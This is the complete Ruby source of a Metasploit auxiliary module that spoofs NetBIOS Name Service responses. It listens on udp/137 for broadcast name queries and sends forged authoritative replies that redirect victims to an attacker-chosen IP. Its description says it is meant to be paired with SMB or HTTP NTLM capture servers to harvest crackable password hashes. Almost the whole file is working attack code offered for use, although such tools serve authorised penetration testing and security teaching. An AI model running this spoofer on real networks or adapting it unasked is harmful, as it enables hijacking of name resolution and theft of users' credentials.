##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Capture

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'           => 'NetBIOS Name Service Spoofer',
            'Description'    => %q{
              This module forges NetBIOS Name Service (NBNS) responses. It will listen for NBNS requests
              sent to the local subnet's broadcast address and spoof a response, redirecting the querying
              machine to an IP of the attacker's choosing. Combined with auxiliary/capture/server/smb or
              capture/server/http_ntlm it is a highly effective means of collecting crackable hashes on
              common networks.

              This module must be run as root and will bind to udp/137 on all interfaces.
            },
            'Author'     => [ 'Tim Medin <tim[at]securitywhole.com>' ],
            'License'    => MSF_LICENSE,
            'References' =>
                [
                    [ 'URL', 'http://www.packetstan.com/2011/03/nbns-spoofing-on-your-way-to-world.html' ]
                ],
            'Actions'		=>
                [
                    [ 'Service' ]
                ],
            'PassiveActions' =>
                [
                    'Service'
                ],
            'DefaultAction'  => 'Service'
        )
    )

    register_options([
      OptAddress.new('SPOOFIP', [ true, "IP address with which to poison responses", "127.0.0.1"]),
      OptString.new('REGEX', [ true, "Regex applied to the NB Name to determine if spoofed reply is sent", '.*']),
    ])

    register_advanced_options([
      OptBool.new('Debug', [ false, "Determines whether incoming packet parsing is displayed", false])
    ])

    deregister_options('RHOST', 'PCAPFILE', 'SNAPLEN', 'FILTER')
  end

  def run
    check_pcaprub_loaded() # Check first since otherwise this is all for naught
    # MacOS X workaround
    ::Socket.do_not_reverse_lookup = true

    @sock = ::UDPSocket.new()
    @sock.setsockopt(::Socket::SOL_SOCKET, ::Socket::SO_REUSEADDR, 1)
    @sock.bind('', 137) # couldn't specify srv host because it missed broadcasts

    @run = true

    print_status("NBNS Spoofer started. Listening for NBNS requests...")

    begin

    while @run # Not exactly thrilled we can never turn this off XXX fix this sometime.
      packet, addr = @sock.recvfrom(512)
      vprint_status("Packet Received from #{addr[3]}")

      rhost = addr[3]
      break if packet.length == 0

      nbnsq_transid      = packet[0..1]
      nbnsq_flags        = packet[2..3]
      nbnsq_questions    = packet[4..5]
      nbnsq_answerrr     = packet[6..7]
      nbnsq_authorityrr  = packet[8..9]
      nbnsq_additionalrr = packet[10..11]
      nbnsq_name         = packet[12..45]
      decoded = ""
      nbnsq_name.slice(1..-2).each_byte do |c|
        decoded << "#{(c - 65).to_s(16)}"
      end
      nbnsq_decodedname = "#{[decoded].pack('H*')}".strip()
      nbnsq_type         = packet[46..47]
      nbnsq_class        = packet[48..49]

      if (nbnsq_decodedname =~ /#{datastore['REGEX']}/i)

        vprint_status("Regex matched #{nbnsq_decodedname} from #{rhost}. Sending reply...")

        if datastore['DEBUG']
          print_status("transid:        #{nbnsq_transid.unpack('H4')}")
          print_status("tlags:          #{nbnsq_flags.unpack('B16')}")
          print_status("questions:      #{nbnsq_questions.unpack('n')}")
          print_status("answerrr:       #{nbnsq_answerrr.unpack('n')}")
          print_status("authorityrr:    #{nbnsq_authorityrr.unpack('n')}")
          print_status("additionalrr:   #{nbnsq_additionalrr.unpack('n')}")
          print_status("name:           #{nbnsq_name} #{nbnsq_name.unpack('H34')}")
          print_status("full name:      #{nbnsq_name.slice(1..-2)}")
          print_status("decoded:        #{decoded}")
          print_status("decoded name:   #{nbnsq_decodedname}")
          print_status("type:           #{nbnsq_type.unpack('n')}")
          print_status("class:          #{nbnsq_class.unpack('n')}")
        end

        # time to build a response packet - Oh YEAH!
        response = nbnsq_transid +
          "\x85\x00" + # Flags = response + authoratative + recursion desired +
          "\x00\x00" + # Questions = 0
          "\x00\x01" + # Answer RRs = 1
          "\x00\x00" + # Authority RRs = 0
          "\x00\x00" + # Additional RRs = 0
          nbnsq_name + # original query name
          nbnsq_type + # Type = NB ...whatever that means
          nbnsq_class+ # Class = IN
          "\x00\x04\x93\xe0" + # TTL = a long ass time
          "\x00\x06" + # Datalength = 6
          "\x00\x00" + # Flags B-node, unique = whet ever that means
          datastore['SPOOFIP'].split('.').collect(&:to_i).pack('C*')

        open_pcap

        p = PacketFu::UDPPacket.new
        p.ip_saddr = Rex::Socket.source_address(rhost)
        p.ip_daddr = rhost
        p.ip_ttl = 255
        p.udp_sport = 137
        p.udp_dport = 137
        p.payload = response
        p.recalc

        capture_sendto(p, rhost)

        close_pcap

      else
        vprint_status("Packet received from #{rhost} with name #{nbnsq_decodedname} did not match regex")
      end
    end

    rescue ::Exception => e
      print_error("nbnspoof: #{e.class} #{e} #{e.backtrace}")
    # Make sure the socket gets closed on exit
    ensure
      @sock.close
    end
  end
end
